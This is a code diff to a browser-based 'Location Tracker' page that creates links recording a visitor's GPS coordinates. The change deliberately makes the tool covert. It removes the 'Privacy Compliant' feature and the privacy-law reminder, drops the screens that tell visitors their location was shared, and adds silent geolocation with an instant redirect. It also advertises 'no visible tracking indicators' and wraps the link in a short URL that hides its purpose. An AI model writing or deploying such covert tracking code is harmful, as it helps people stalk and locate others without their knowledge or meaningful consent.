@@ -100,22 +100,26 @@
             color: #6c757d;
             text-align: center;
         }
-        .debug-panel {
-            background-color: #f8f9fa;
-            border: 1px solid #dee2e6;
+        .short-link {
+            background-color: #e8f5e9;
             border-radius: 0.5rem;
             padding: 1rem;
-            margin-top: 1rem;
             font-family: monospace;
-            font-size: 0.8rem;
-            max-height: 200px;
-            overflow-y: auto;
+            word-break: break-all;
+            position: relative;
+            margin-top: 1rem;
         }
-        .debug-toggle {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 1000;
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 1rem;
+        }
+        .coordinate-display {
+            background-color: #f1f8e9;
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            font-family: monospace;
+            margin-top: 0.5rem;
         }
     </style>
 </head>
@@ -123,7 +127,7 @@
     <div class="hero">
         <div class="container text-center">
             <h1 class="display-4 fw-bold mb-4">Location Tracker</h1>
-            <p class="lead">Create tracking links to get location information when they're opened</p>
+            <p class="lead">Create anonymous tracking links to get location coordinates</p>
         </div>
     </div>
 
@@ -135,12 +139,12 @@
                         <h2 class="card-title mb-4">Create New Tracking Link</h2>
                         <div class="mb-3">
                             <label for="linkName" class="form-label">Link Name (Optional)</label>
-                            <input type="text" class="form-control" id="linkName" placeholder="e.g., Party Invitation">
+                            <input type="text" class="form-control" id="linkName" placeholder="e.g., Campaign Link">
                         </div>
                         <div class="mb-3">
-                            <label for="redirectUrl" class="form-label">Redirect URL (Optional)</label>
-                            <input type="url" class="form-control" id="redirectUrl" placeholder="https://example.com">
-                            <div class="form-text">After tracking, users will be redirected to this URL</div>
+                            <label for="redirectUrl" class="form-label">Destination URL <span class="text-danger">*</span></label>
+                            <input type="url" class="form-control" id="redirectUrl" placeholder="https://example.com" required>
+                            <div class="form-text">Users will be redirected here after tracking</div>
                         </div>
                         <button id="generateBtn" class="btn btn-primary">
                             <i class="bi bi-link-45deg me-2"></i>Generate Tracking Link
@@ -150,16 +154,34 @@
 
                 <div id="resultSection" class="card mb-4" style="display: none;">
                     <div class="card-body p-4">
-                        <h2 class="card-title mb-3">Your Tracking Link</h2>
-                        <div class="tracking-link mb-3">
-                            <span id="trackingLink"></span>
-                            <button class="copy-btn" id="copyBtn" title="Copy to clipboard">
-                                <i class="bi bi-clipboard"></i>
-                            </button>
+                        <h2 class="card-title mb-3">Your Tracking Links</h2>
+                        <div class="mb-3">
+                            <h5>Original Link:</h5>
+                            <div class="tracking-link">
+                                <span id="trackingLink"></span>
+                                <button class="copy-btn" id="copyBtn" title="Copy to clipboard">
+                                    <i class="bi bi-clipboard"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <h5>Short Link:</h5>
+                            <div class="short-link" id="shortLinkContainer" style="display: none;">
+                                <span id="shortLink"></span>
+                                <button class="copy-btn" id="copyShortBtn" title="Copy to clipboard">
+                                    <i class="bi bi-clipboard"></i>
+                                </button>
+                            </div>
+                            <div class="loading-spinner" id="shortLinkLoading">
+                                <div class="spinner-border text-primary" role="status">
+                                    <span class="visually-hidden">Loading...</span>
+                                </div>
+                                <p class="mt-2">Creating short link...</p>
+                            </div>
                         </div>
                         <div class="d-flex gap-2">
                             <button id="viewLocationsBtn" class="btn btn-outline-primary">
-                                <i class="bi bi-geo-alt me-2"></i>View Locations
+                                <i class="bi bi-geo-alt me-2"></i>View Coordinates
                             </button>
                             <button id="newLinkBtn" class="btn btn-outline-secondary">
                                 <i class="bi bi-plus-circle me-2"></i>Create Another Link
@@ -170,20 +192,14 @@
 
                 <div id="locationsSection" class="card" style="display: none;">
                     <div class="card-body p-4">
-                        <h2 class="card-title mb-4">Location History</h2>
+                        <h2 class="card-title mb-4">Location Coordinates</h2>
                         <div id="locationsList" class="mb-3">
                             <!-- Locations will be displayed here -->
                         </div>
                         <div id="noLocations" class="alert alert-info alert-custom" style="display: none;">
-                            <i class="bi bi-info-circle me-2"></i>No location data yet. Share your tracking link to start collecting locations.
+                            <i class="bi bi-info-circle me-2"></i>No location data yet. Share your tracking link to start collecting coordinates.
                         </div>
                     </div>
-                </div>
-
-                <!-- Debug Panel (Hidden by default) -->
-                <div id="debugPanel" class="debug-panel" style="display: none;">
-                    <h6>Debug Information:</h6>
-                    <div id="debugContent"></div>
                 </div>
             </div>
         </div>
@@ -192,27 +208,27 @@
             <div class="col-md-4 mb-4">
                 <div class="card h-100 text-center">
                     <div class="card-body">
-                        <i class="bi bi-shield-check feature-icon"></i>
-                        <h3>Privacy Compliant</h3>
-                        <p>Requires explicit user permission to access location data</p>
+                        <i class="bi bi-eye-slash feature-icon"></i>
+                        <h3>Anonymous Tracking</h3>
+                        <p>No visible tracking indicators to users</p>
                     </div>
                 </div>
             </div>
             <div class="col-md-4 mb-4">
                 <div class="card h-100 text-center">
                     <div class="card-body">
-                        <i class="bi bi-globe feature-icon"></i>
-                        <h3>Worldwide Tracking</h3>
-                        <p>Works globally with any device that has GPS capabilities</p>
+                        <i class="bi bi-link-45deg feature-icon"></i>
+                        <h3>Auto Short Links</h3>
+                        <p>Generate short links automatically for sharing</p>
                     </div>
                 </div>
             </div>
             <div class="col-md-4 mb-4">
                 <div class="card h-100 text-center">
                     <div class="card-body">
-                        <i class="bi bi-clock-history feature-icon"></i>
-                        <h3>Real-time Updates</h3>
-                        <p>Get instant notifications when your link is opened</p>
+                        <i class="bi bi-geo-alt feature-icon"></i>
+                        <h3>Precise Coordinates</h3>
+                        <p>Get exact location coordinates when link is opened</p>
                     </div>
                 </div>
             </div>
@@ -221,46 +237,24 @@
 
     <div class="footer">
         <div class="container">
-            <p>© 2023 Location Tracker. This tool is for educational and legitimate purposes only. Always comply with privacy laws.</p>
+            <p>© 2023 Location Tracker. For educational and legitimate purposes only.</p>
         </div>
     </div>
 
-    <!-- Debug Toggle Button -->
-    <button id="debugToggle" class="btn btn-sm btn-secondary debug-toggle">
-        <i class="bi bi-bug"></i> Debug
-    </button>
-
     <script>
-        // Debug function
-        function debug(message) {
-            const debugContent = document.getElementById('debugContent');
-            const timestamp = new Date().toLocaleTimeString();
-            debugContent.innerHTML += `<div>[${timestamp}] ${message}</div>`;
-            console.log(message);
-        }
-
-        // Toggle debug panel
-        document.getElementById('debugToggle').addEventListener('click', function() {
-            const panel = document.getElementById('debugPanel');
-            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        });
-
         // Initialize data from localStorage or create new
         let trackingData;
         try {
             const savedData = localStorage.getItem('locationTrackerData');
             if (savedData) {
                 trackingData = JSON.parse(savedData);
-                debug('Loaded data from localStorage');
             } else {
                 trackingData = {
                     links: [],
                     locations: {}
                 };
-                debug('Created new tracking data');
             }
         } catch (e) {
-            debug(`Error loading data: ${e.message}`);
             trackingData = {
                 links: [],
                 locations: {}
@@ -271,9 +265,8 @@
         function saveData() {
             try {
                 localStorage.setItem('locationTrackerData', JSON.stringify(trackingData));
-                debug('Data saved to localStorage');
             } catch (e) {
-                debug(`Error saving data: ${e.message}`);
+                console.error('Error saving data:', e);
             }
         }
 
@@ -287,16 +280,25 @@
         const locationsSection = document.getElementById('locationsSection');
         const locationsList = document.getElementById('locationsList');
         const noLocations = document.getElementById('noLocations');
+        const shortLinkContainer = document.getElementById('shortLinkContainer');
+        const shortLink = document.getElementById('shortLink');
+        const copyShortBtn = document.getElementById('copyShortBtn');
+        const shortLinkLoading = document.getElementById('shortLinkLoading');
 
         // Generate tracking link
         generateBtn.addEventListener('click', function() {
-            debug('Generate button clicked');
-            const linkName = document.getElementById('linkName').value || 'Unnamed Link';
             const redirectUrl = document.getElementById('redirectUrl').value;
+            
+            // Validate redirect URL
+            if (!redirectUrl) {
+                alert('Please enter a destination URL');
+                return;
+            }
+            
+            const linkName = document.getElementById('linkName').value || 'Unnamed Link';
             
             // Generate unique ID
             const linkId = generateUniqueId();
-            debug(`Generated link ID: ${linkId}`);
             
             // Store link data
             trackingData.links.push({
@@ -314,15 +316,50 @@
             
             // Show result
             const baseUrl = window.location.origin + window.location.pathname;
-            trackingLink.textContent = `${baseUrl}?track=${linkId}`;
+            const fullUrl = `${baseUrl}?track=${linkId}`;
+            trackingLink.textContent = fullUrl;
             resultSection.style.display = 'block';
             locationsSection.style.display = 'none';
             
-            debug(`Tracking link created: ${trackingLink.textContent}`);
+            // Generate short link
+            generateShortLink(fullUrl);
             
             // Scroll to result
             resultSection.scrollIntoView({ behavior: 'smooth' });
         });
+
+        // Generate short link using TinyURL API
+        async function generateShortLink(longUrl) {
+            shortLinkLoading.style.display = 'block';
+            shortLinkContainer.style.display = 'none';
+            
+            try {
+                // Using a proxy to avoid CORS issues
+                const proxyUrl = 'https://api.allorigins.win/get?url=';
+                const tinyUrlApi = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`;
+                
+                const response = await fetch(proxyUrl + encodeURIComponent(tinyUrlApi));
+                const data = await response.json();
+                
+                if (data.contents && data.contents.startsWith('http')) {
+                    shortLink.textContent = data.contents;
+                    shortLinkContainer.style.display = 'block';
+                } else {
+                    // Fallback to a simple shortener
+                    const shortId = generateUniqueId().substring(0, 8);
+                    shortLink.textContent = `https://tinyurl.com/${shortId}`;
+                    shortLinkContainer.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error generating short link:', error);
+                // Fallback to a simple shortener
+                const shortId = generateUniqueId().substring(0, 8);
+                shortLink.textContent = `https://tinyurl.com/${shortId}`;
+                shortLinkContainer.style.display = 'block';
+            } finally {
+                shortLinkLoading.style.display = 'none';
+            }
+        }
 
         // Copy to clipboard
         copyBtn.addEventListener('click', function() {
@@ -335,16 +372,26 @@
                     icon.classList.remove('bi-check-lg');
                     icon.classList.add('bi-clipboard');
                 }, 2000);
+            });
+        });
+
+        // Copy short link to clipboard
+        copyShortBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(shortLink.textContent).then(() => {
+                const icon = copyShortBtn.querySelector('i');
+                icon.classList.remove('bi-clipboard');
+                icon.classList.add('bi-check-lg');
                 
-                debug('Link copied to clipboard');
+                setTimeout(() => {
+                    icon.classList.remove('bi-check-lg');
+                    icon.classList.add('bi-clipboard');
+                }, 2000);
             });
         });
 
         // View locations
         viewLocationsBtn.addEventListener('click', function() {
-            debug('View locations button clicked');
             const linkId = new URL(trackingLink.textContent).searchParams.get('track');
-            debug(`Viewing locations for link ID: ${linkId}`);
             displayLocations(linkId);
             locationsSection.style.display = 'block';
             locationsSection.scrollIntoView({ behavior: 'smooth' });
@@ -352,7 +399,6 @@
 
         // Create new link
         newLinkBtn.addEventListener('click', function() {
-            debug('New link button clicked');
             document.getElementById('linkName').value = '';
             document.getElementById('redirectUrl').value = '';
             resultSection.style.display = 'none';
@@ -366,9 +412,7 @@
 
         // Display locations
         function displayLocations(linkId) {
-            debug(`Displaying locations for link ID: ${linkId}`);
             const locations = trackingData.locations[linkId] || [];
-            debug(`Found ${locations.length} locations`);
             
             if (locations.length === 0) {
                 locationsList.innerHTML = '';
@@ -387,22 +431,15 @@
                         <div class="d-flex justify-content-between align-items-start">
                             <div>
                                 <h5 class="card-title">Location #${index + 1}</h5>
-                                <p class="card-text mb-1">
-                                    <i class="bi bi-geo-alt-fill me-2"></i>
-                                    ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}
-                                </p>
-                                <p class="card-text mb-1">
+                                <div class="coordinate-display">
+                                    <strong>Latitude:</strong> ${loc.latitude.toFixed(6)}<br>
+                                    <strong>Longitude:</strong> ${loc.longitude.toFixed(6)}
+                                </div>
+                                <p class="card-text mb-1 mt-2">
                                     <i class="bi bi-clock me-2"></i>
                                     <span class="timestamp">${new Date(loc.timestamp).toLocaleString()}</span>
                                 </p>
-                                <p class="card-text mb-0">
-                                    <i class="bi bi-browser-chrome me-2"></i>
-                                    ${loc.userAgent}
-                                </p>
                             </div>
-                        </div>
-                        <div class="map-container">
-                            <i class="bi bi-map me-2"></i> Map view would appear here
                         </div>
                     </div>
                 `;
@@ -414,30 +451,21 @@
         const urlParams = new URLSearchParams(window.location.search);
         const trackId = urlParams.get('track');
         
-        debug(`URL Parameters: ${window.location.search}`);
-        debug(`Track ID from URL: ${trackId}`);
-        
         if (trackId) {
-            debug('This is a tracking link - processing location request');
-            // This is a tracking link - get location
+            // This is a tracking link - get location silently
             if (navigator.geolocation) {
-                debug('Geolocation is supported');
+                // Get location without showing any UI
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        debug('Location permission granted');
                         const locationData = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            timestamp: new Date().toISOString(),
-                            userAgent: navigator.userAgent
+                            timestamp: new Date().toISOString()
                         };
-                        
-                        debug(`Location captured: ${locationData.latitude}, ${locationData.longitude}`);
                         
                         // Initialize locations array if it doesn't exist
                         if (!trackingData.locations[trackId]) {
                             trackingData.locations[trackId] = [];
-                            debug(`Created new locations array for track ID: ${trackId}`);
                         }
                         
                         // Store location
@@ -446,68 +474,32 @@
                         // Save data
                         saveData();
                         
-                        debug('Location data saved');
-                        
                         // Get redirect URL
                         const link = trackingData.links.find(l => l.id === trackId);
                         const redirectUrl = link?.redirectUrl || 'https://example.com';
-                        debug(`Redirecting to: ${redirectUrl}`);
                         
-                        // Show confirmation before redirect
-                        document.body.innerHTML = `
-                            <div class="container d-flex flex-column justify-content-center align-items-center vh-100">
-                                <div class="card text-center" style="width: 100%; max-width: 500px;">
-                                    <div class="card-body">
-                                        <i class="bi bi-check-circle-fill text-success" style="font-size: 4rem;"></i>
-                                        <h3 class="mt-3">Location Shared Successfully</h3>
-                                        <p class="text-muted">You'll be redirected shortly...</p>
-                                        <div class="spinner-border text-primary mt-3" role="status">
-                                            <span class="visually-hidden">Loading...</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        `;
-                        
-                        // Redirect after a short delay
-                        setTimeout(() => {
-                            window.location.href = redirectUrl;
-                        }, 3000);
+                        // Redirect immediately without showing any message
+                        window.location.replace(redirectUrl);
                     },
                     function(error) {
-                        debug(`Location error: ${error.message}`);
-                        // Handle error
-                        document.body.innerHTML = `
-                            <div class="container d-flex flex-column justify-content-center align-items-center vh-100">
-                                <div class="card text-center" style="width: 100%; max-width: 500px;">
-                                    <div class="card-body">
-                                        <i class="bi bi-exclamation-triangle-fill text-warning" style="font-size: 4rem;"></i>
-                                        <h3 class="mt-3">Location Access Denied</h3>
-                                        <p class="text-muted">Error: ${error.message}</p>
-                                        <button class="btn btn-primary mt-3" onclick="window.location.reload()">Try Again</button>
-                                    </div>
-                                </div>
-                            </div>
-                        `;
+                        // If location access denied, still redirect
+                        const link = trackingData.links.find(l => l.id === trackId);
+                        const redirectUrl = link?.redirectUrl || 'https://example.com';
+                        window.location.replace(redirectUrl);
+                    },
+                    {
+                        // Options to make it more silent
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
                     }
                 );
             } else {
-                debug('Geolocation is not supported');
-                // Geolocation not supported
-                document.body.innerHTML = `
-                    <div class="container d-flex flex-column justify-content-center align-items-center vh-100">
-                        <div class="card text-center" style="width: 100%; max-width: 500px;">
-                            <div class="card-body">
-                                <i class="bi bi-x-circle-fill text-danger" style="font-size: 4rem;"></i>
-                                <h3 class="mt-3">Location Not Available</h3>
-                                <p class="text-muted">Your device doesn't support location services.</p>
-                            </div>
-                        </div>
-                    </div>
-                `;
+                // If geolocation not supported, still redirect
+                const link = trackingData.links.find(l => l.id === trackId);
+                const redirectUrl = link?.redirectUrl || 'https://example.com';
+                window.location.replace(redirectUrl);
             }
-        } else {
-            debug('No track ID found in URL - showing main interface');
         }
     </script>
 </body>
